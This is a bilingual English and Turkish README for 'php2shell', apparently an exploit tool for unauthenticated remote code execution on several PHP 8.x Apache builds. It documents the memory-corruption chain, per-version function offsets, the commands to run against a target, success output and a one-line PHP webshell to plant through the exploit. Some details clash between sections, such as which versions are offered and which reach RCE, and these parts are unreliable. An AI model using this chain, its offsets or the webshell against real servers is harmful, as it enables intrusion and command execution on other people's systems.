# php2shell — unauthenticated RCE (PHP 8.3.33 / 8.3.35 / 8.4.26 / 8.5.11)

**CVE-2026-109618 / CVE-2026-109619** · [EDB-52704](https://www.exploit-db.com/exploits/52704)

A single self-contained Python file that achieves **unauthenticated remote code
execution as `www-data` (`uid=33`)** on stock `php:<ver>-apache` containers. No
third-party dependencies — standard library only.

> Research credit: core chain by **9bie** and **eness**, adjusted by **OffSec**;
> per-version calibrations cross-checked against **devploit/php2shell**.
> This file re-implements and consolidates that chain into one script.

---

## What it does

Sends plain HTTP `multipart/form-data` requests that (1) rotate the prefork
worker, (2) leak the Zend MM chunk base and the `libphp.so` base via the
`Set-Cookie` header, then (3) forge a `zend_array` whose destructor is
`zif_system`. At request shutdown the engine calls
`zval_ptr_dtor(&PS(http_session_vars))` → `zif_system(cmd)` → **RCE**.

Default proof command: `id > /www/p1`, read back with `GET /p1` → `uid=33`.

## Supported versions (RCE verified on live `php:<ver>-apache` containers)

| PHP   | stage-3 path | proof time* |
|-------|--------------|-------------|
| 8.3.33 | 9bie spray   | ~16 s |
| 8.3.35 | 9bie spray   | ~16 s |
| 8.4.26 | carrier      | ~16 s |
| 8.5.11 | carrier      | ~17 s |

\* single attempt to a live target; the script retries automatically (default 6).

> **Known-affected but NOT RCE-able with this tool** (offsets extracted, but
> neither the carrier path nor the 9bie path lands on their heap layout —
> verified by exhaustive `htdata`/`s_off` scans against live containers):
> **8.5.9, 8.4.24, 8.4.25, 8.5.10.** They are present in the `VERSIONS` table
> (so `-v` accepts them) but do not reach RCE; their per-version heap
> calibration is not solved here.

## Requirements

- **Python 3.9+** (no pip packages).
- A target matching the reference environment below (the exploit is calibrated
  to it — see *Calibration*).

### Reference target environment (Docker)

```
image      php:<ver>-apache   (Debian bookworm, Apache 2.4, mod_php, mpm_prefork)
worker     SINGLE-worker prefork (see config)
docroot    /var/www/html  (symlinked as /www)
```

**`php.ini`** (drop-in `conf.d/99_p2s.ini`):
```ini
[PHP]
display_errors=1
memory_limit=128M
max_input_vars=1000
post_max_size=512M
upload_max_filesize=512M

[Session]
session.use_cookies=1
session.use_strict_mode=0
session.upload_progress.enabled=1
```

**`mpm_prefork.conf`** (single worker — the leak depends on a deterministic
single-thread heap):
```
<IfModule mpm_prefork_module>
    StartServers             1
    MinSpareServers          1
    MaxSpareServers          1
    MaxRequestWorkers        1
    ServerLimit              1
</IfModule>
```

**`index.php`**:
```php
<?php session_start(); echo "OK";
```

### Bring up a target

```bash
docker run -d --name p2s -p 8080:80 php:8.4.26-apache

# 1) php.ini
docker exec -i p2s tee /usr/local/etc/php/conf.d/99_p2s.ini > /dev/null <<'INI'
display_errors=1
memory_limit=128M
max_input_vars=1000
post_max_size=512M
upload_max_filesize=512M
session.use_cookies=1
session.use_strict_mode=0
session.upload_progress.enabled=1
INI

# 2) single-worker prefork
docker exec -i p2s tee /etc/apache2/mods-available/mpm_prefork.conf > /dev/null <<'CONF'
<IfModule mpm_prefork_module>
    StartServers 1
    MinSpareServers 1
    MaxSpareServers 1
    MaxRequestWorkers 1
    ServerLimit 1
</IfModule>
CONF
docker exec p2s sh -c "a2enmod mpm_prefork && a2dismod mpm_event && a2dismod mpm_worker"

# 3) target page + docroot symlink
docker exec -i p2s tee /var/www/html/index.php > /dev/null <<'PHP'
<?php session_start(); echo "OK";
PHP
docker exec p2s ln -sf /var/www/html /www
docker exec p2s apache2ctl restart
```

## Usage

```bash
python3 php2shell.py -t http://127.0.0.1:8080 -v 8.4.26
```

| Option | Description | Default |
|--------|-------------|---------|
| `-t, --target` | target base URL (`http://` or `https://`) | — |
| `-v, --version` | `8.3.35 \| 8.4.26 \| 8.5.10 \| 8.5.11` | `8.4.26` |
| `--cmd` | shell command to run (≤ 14 bytes on the carrier path) | `id>/www/p1` |
| `--htdoc` | target docroot dir | `/www` |
| `--proof` | proof filename under the docroot | `p1` |
| `--shell FILE` | **optional** webshell to deploy (9bie path / 8.3.35 only, ~200-byte budget) | — |
| `--attempts` | full-chain attempts | `6` |

Example output:
```
[*] php2shell  8.4.26  target=http://127.0.0.1:8080  stage3=carrier
[*] zif=0x465370 dtor=0x65eb60 htdata=0x690d8
[*] cmd: 'id>/www/p1'   proof: GET http://127.0.0.1:8080/p1
[+] RCE PROVEN  8.4.26  stage3=carrier  (16.1s)
    GET http://127.0.0.1:8080/p1
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## How it works

1. **Worker rotation** — abort the current prefork child over HTTP; Apache forks a
   fresh one with a clean, deterministic heap.
2. **Stage 1 — heap leak.** An OOM/bailout leaves a forged 79-byte `zend_string`
   covering `PS(id)`; its `len` overflows into the next chunk header, so the
   `Set-Cookie` value spills a heap pointer → **chunk base** (2 MB-aligned).
3. **Stage 2 — libphp leak.** Same technique leaks a `libphp.so` pointer →
   **libphp base** (4 KB-aligned). `zif_system = base + zif_offset`.
4. **Stage 3 — fake destructor.**
   - **8.3.35 (9bie spray):** a cheap OOM dangles `PS(http_session_vars)`; a 995×384-byte
     spray overwrites it with a fake `zend_array` whose `pDestructor = zif_system`.
   - **8.4.26 / 8.5.x (carrier):** a 15-byte bin-40 `zend_string` lands exactly on
     `PS(http_session_vars)` and points at a 167-byte fake `zend_array`.
5. **Shutdown.** `zval_ptr_dtor(&PS(http_session_vars))` runs the fake destructor →
   `zif_system(cmd)` → command executed as `www-data`.

## Calibration (per-version offsets)

All offsets are relative (ASLR-independent). `zif`/`dtor` are offsets inside
`libphp.so`; `htdata`/`s_off` are offsets from the leaked chunk base.

| Version | `zif_system` | `zval_ptr_dtor` | `htdata` | `s_off` | path | RCE |
|---------|--------------|-----------------|----------|---------|------|-----|
| 8.3.33  | `0x3abf80` | `0x49e650` | — | `0xF6398` | 9bie | ✓ |
| 8.3.35  | `0x3ac080` | `0x49ec50` | — | `0xF6398` | 9bie | ✓ |
| 8.4.24  | `0x464530` | `0x65d1e0` | `0x690d8`* | — | carrier | ✗ |
| 8.4.25  | `0x464c70` | `0x65dc60` | `0x690d8`* | — | carrier | ✗ |
| 8.4.26  | `0x465370` | `0x65eb60` | `0x690d8` | — | carrier | ✓ |
| 8.5.9   | `0x598160` | `0x7b29a0` | `0x690d8`* | — | carrier | ✗ |
| 8.5.10  | `0x598d60` | `0x7b3860` | `0x690d8`* | — | carrier | ✗ |
| 8.5.11  | `0x5996e0` | `0x7b47a0` | `0x690d8` | — | carrier | ✓ |

\* default `htdata` carried over from the working versions; it does **not**
land for these four — both the carrier and the 9bie (`s_off`) paths were
exhaustively scanned and neither reaches RCE.

Derive offsets for a new build:
```bash
docker exec p2s nm /usr/lib/apache2/modules/libphp.so | grep -wE 'zif_system|zval_ptr_dtor'
```

## Command-length limit

The **carrier** path embeds the command in a 167-byte live `zend_string`, capping it
at **14 bytes** (e.g. `id>/www/p1`). The **9bie** path (8.3.35) allows **~200 bytes**,
so it can also deploy a webshell:

```bash
# --shell takes a one-line webshell file you provide (e.g. `<?php echo shell_exec($_GET['c']);?>`)
python3 php2shell.py -t http://127.0.0.1:18112 -v 8.3.35 --shell webshell.php
```

## Files

| File | Purpose |
|------|---------|
| `php2shell.py` | the single self-contained exploit (all stages) |

## Legal / safety

This is a security research PoC. Only run it on systems you own or are
explicitly authorized to test. Unauthorised access to computer systems is a
crime in most jurisdictions.

---
---

# php2shell — kimlik doğrulamasız RCE (PHP 8.3.33 / 8.3.35 / 8.4.26 / 8.5.11)

**CVE-2026-109618 / CVE-2026-109619** · [EDB-52704](https://www.exploit-db.com/exploits/52704)

Standart `php:<ver>-apache` konteynerlerinde **`www-data` (`uid=33`) olarak
kimlik doğrulamasız uzaktan kod çalıştıran** tek, bağımsız (self-contained)
Python dosyası. Üçüncü parti bağımlılık yok — yalnızca stdlib.

> Araştırma: çekirdek zincir **9bie** ve **eness**, ayarlar **OffSec**;
> sürüm kalibrasyonları **devploit/php2shell** ile çapraz doğrulandı.
> Bu dosya o zinciri tek script içinde yeniden uygular.

## Ne yapıyor

Sıradan HTTP `multipart/form-data` istekleriyle (1) prefork worker'ı döndürür,
(2) `Set-Cookie` başlığından Zend MM chunk base + `libphp.so` base'ini sızdırır,
(3) destructor'ü `zif_system` olan sahte bir `zend_array` üretir. İstek kapanırken
motor `zval_ptr_dtor(&PS(http_session_vars))` → `zif_system(cmd)` çağırır → **RCE**.

Varsayılan kanıt komutu: `id > /www/p1`, `GET /p1` ile okunur → `uid=33`.

## Desteklenen sürümler

| PHP   | stage-3 yolu | süre* |
|-------|--------------|-------|
| 8.3.33 | 9bie spray   | ~16 sn |
| 8.3.35 | 9bie spray   | ~16 sn |
| 8.4.26 | carrier      | ~16 sn |
| 8.5.11 | carrier      | ~17 sn |

\* canlı hedefe tek deneme; script otomatik tekrarlar (varsayılan 6).

> **Bilinçli etkilendi AMA bu araçla RCE edilemeyen** (offset'ler çıkarıldı,
> ama ne carrier ne 9bie yolu onların heap layout'una oturuyor — canlı
> konteynerlerde exhaustive `htdata`/`s_off` taramasıyla doğrulandı):
> **8.5.9, 8.4.24, 8.4.25, 8.5.10.** `VERSIONS` tablosunda mevcutlar (`-v`
> kabul eder) ama RCE'ye ulaşmazlar.

## Gereksinimler

- **Python 3.9+** (pip paketi yok).
- Aşağıdaki referans ortamıyla uyan bir hedef (kalibrasyon buna göre).

### Referans hedef ortamı (Docker)

```
image      php:<ver>-apache   (Debian bookworm, Apache 2.4, mod_php, mpm_prefork)
worker     TEK-worker prefork (config'e bak)
docroot    /var/www/html  (/www olarak symlink'li)
```

**`php.ini`** (`conf.d/99_p2s.ini`):
```ini
[PHP]
display_errors=1
memory_limit=128M
max_input_vars=1000
post_max_size=512M
upload_max_filesize=512M

[Session]
session.use_cookies=1
session.use_strict_mode=0
session.upload_progress.enabled=1
```

**`mpm_prefork.conf`** (tek worker — leak deterministik tek-thread heap'e
bağlıdır):
```
<IfModule mpm_prefork_module>
    StartServers             1
    MinSpareServers          1
    MaxSpareServers          1
    MaxRequestWorkers        1
    ServerLimit              1
</IfModule>
```

**`index.php`**:
```php
<?php session_start(); echo "OK";
```

### Hedefi ayağa kaldırma

```bash
docker run -d --name p2s -p 8080:80 php:8.4.26-apache

# 1) php.ini
docker exec -i p2s tee /usr/local/etc/php/conf.d/99_p2s.ini > /dev/null <<'INI'
display_errors=1
memory_limit=128M
max_input_vars=1000
post_max_size=512M
upload_max_filesize=512M
session.use_cookies=1
session.use_strict_mode=0
session.upload_progress.enabled=1
INI

# 2) tek-worker prefork
docker exec -i p2s tee /etc/apache2/mods-available/mpm_prefork.conf > /dev/null <<'CONF'
<IfModule mpm_prefork_module>
    StartServers 1
    MinSpareServers 1
    MaxSpareServers 1
    MaxRequestWorkers 1
    ServerLimit 1
</IfModule>
CONF
docker exec p2s sh -c "a2enmod mpm_prefork && a2dismod mpm_event && a2dismod mpm_worker"

# 3) hedef sayfa + docroot symlink
docker exec -i p2s tee /var/www/html/index.php > /dev/null <<'PHP'
<?php session_start(); echo "OK";
PHP
docker exec p2s ln -sf /var/www/html /www
docker exec p2s apache2ctl restart
```

## Kullanım

```bash
python3 php2shell.py -t http://127.0.0.1:8080 -v 8.4.26
```

| Seçenek | Açıklama | Varsayılan |
|---------|----------|------------|
| `-t, --target` | hedef base URL (`http://` veya `https://`) | — |
| `-v, --version` | `8.3.35 \| 8.4.26 \| 8.5.10 \| 8.5.11` | `8.4.26` |
| `--cmd` | çalıştırılacak komut (carrier'da ≤ 14 bayt) | `id>/www/p1` |
| `--htdoc` | hedef docroot dizini | `/www` |
| `--proof` | docroot altındaki kanıt dosyası | `p1` |
| `--shell DOSYA` | **opsiyonel** webshell (yalnız 9bie / 8.3.35, ~200 bayt) | — |
| `--attempts` | tam zincir deneme sayısı | `6` |

## Nasıl çalışıyor

1. **Worker rotasyonu** — HTTP ile mevcut prefork child'ı abort et; Apache temiz,
   deterministik heap'li yenisini fork'lar.
2. **Stage 1 — heap leak.** OOM/bailout, `PS(id)`'yi örten sahte 79B `zend_string`
   bırakır; `len` overflow'u chunk header'a taşar → `Set-Cookie` heap pointer
   sızdırır → **chunk base** (2MB hizalı).
3. **Stage 2 — libphp leak.** Aynı teknikle `libphp.so` pointer'ı → **libphp base**
   (4KB hizalı). `zif_system = base + zif_offset`.
4. **Stage 3 — sahte destructor.**
   - **8.3.35 (9bie spray):** ucuz OOM `PS(http_session_vars)`'ı sarkıtır; 995×384B
     spray onu `pDestructor = zif_system` olan sahte `zend_array` ile ezer.
   - **8.4.26 / 8.5.x (carrier):** 15B bin-40 `zend_string` tam `PS(http_session_vars)`
     üzerine iner ve 167B sahte `zend_array`'a işaret eder.
5. **Kapanış.** `zval_ptr_dtor(&PS(http_session_vars))` sahte destructor'u çalıştırır
   → `zif_system(cmd)` → `www-data` olarak komut.

## Kalibrasyon (sürüm başına offset'ler)

Tüm offset'ler görelidir (ASLR'dan bağımsız). `zif`/`dtor` `libphp.so` içi
offset; `htdata`/`s_off` sızdırılan chunk base'e göre offset.

| Sürüm | `zif_system` | `zval_ptr_dtor` | `htdata` | `s_off` | yol |
|-------|--------------|-----------------|----------|---------|-----|
| 8.3.35  | `0x3ac080` | `0x49ec50` | `0x690d8` | `0xF6398` | 9bie |
| 8.4.26  | `0x465370` | `0x65eb60` | `0x690d8` | — | carrier |
| 8.5.10  | `0x598d60` | `0x7b3860` | `0x690d8` | — | carrier |
| 8.5.11  | `0x5996e0` | `0x7b47a0` | `0x690d8` | — | carrier |

Yeni bir build için offset'leri türet:
```bash
docker exec p2s nm /usr/lib/apache2/modules/libphp.so | grep -wE 'zif_system|zval_ptr_dtor'
```

## Komut uzunluğu sınırı

**carrier** yol komutu 167B canlı `zend_string` içine gömer → **14 bayt** sınırı
(örn. `id>/www/p1`). **9bie** yol (8.3.35) **~200 bayt**a izin verir, bu yüzden
webshell de deploy edilebilir:

```bash
# --shell, sağladığınız tek satırlık webshell dosyasını alır (içinde `<?php echo shell_exec($_GET['c']);?>`)
python3 php2shell.py -t http://127.0.0.1:18112 -v 8.3.35 --shell webshell.php
```

## Dosyalar

| Dosya | Amaç |
|-------|------|
| `php2shell.py` | tek self-contained exploit (tüm aşamalar) |

## Yasal / güvenlik

Bu bir güvenlik araştırması PoC'idir. Yalnızca sahip olduğunuz veya test
etmek için açık yetkiniz olan sistemlerde çalıştırın. Yetkisiz erişim çoğu
ülkede suçtur.
